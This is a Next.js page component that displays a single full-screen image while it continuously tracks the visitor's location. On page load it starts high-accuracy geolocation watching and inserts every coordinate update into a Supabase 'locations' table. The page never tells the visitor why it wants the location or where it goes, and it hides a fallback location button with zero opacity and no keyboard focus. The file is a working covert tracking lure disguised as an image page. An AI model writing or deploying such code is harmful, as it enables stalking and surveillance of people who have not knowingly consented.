

'use client';
import React, { useEffect, useState } from 'react';
import { supabase } from '../lib/supabaseClient';

function LocationRequest() {
  const [tried, setTried] = useState(false);
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);

  // Save location to Supabase
  const saveLocation = async (latitude: number, longitude: number) => {
    setSaving(true);
    setError(null);
    setSuccess(false);
    const { error } = await supabase.from('locations').insert([{ latitude, longitude }]);
    if (error) {
      setError(error.message);
    } else {
      setSuccess(true);
    }
    setSaving(false);
  };

  useEffect(() => {
    if (navigator.geolocation && !tried) {
      const watchId = navigator.geolocation.watchPosition(
        (pos) => {
          const { latitude, longitude } = pos.coords;
          saveLocation(latitude, longitude);
        },
        (err) => {
          setError(err.message);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
      setTried(true);
      return () => navigator.geolocation.clearWatch(watchId);
    }
  }, [tried]);

  // Fallback button for manual request
  const requestLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const { latitude, longitude } = pos.coords;
          saveLocation(latitude, longitude);
        },
        (err) => {
          setError(err.message);
        }
      );
    }
  };

  return (
    <div>
      <button
        style={{ position: 'absolute', top: 16, right: 16, zIndex: 10, opacity: 0 }}
        aria-label="Request location"
        onClick={requestLocation}
        tabIndex={-1}
        disabled={saving}
      >
        Request Location
      </button>
      {saving && <div style={{position:'absolute',top:40,right:16,zIndex:10}}>Saving location...</div>}
      {error && <div style={{position:'absolute',top:60,right:16,zIndex:10,color:'red'}}>Error: {error}</div>}
      {success && <div style={{position:'absolute',top:80,right:16,zIndex:10,color:'green'}}>Location saved!</div>}
    </div>
  );
}

export default function Page() {
  return (
    <div style={{
      width: '100vw',
      height: '100vh',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      background: '#fff',
      margin: 0,
      padding: 0,
    }}>
      <img
        src="https://neostuffs.com/wp-content/uploads/2016/05/rastra.jpg"
        alt="Rastra"
        style={{
          maxWidth: '100vw',
          maxHeight: '100vh',
          objectFit: 'contain',
          borderRadius: 12,
        }}
      />
      <LocationRequest />
    </div>
  );
}
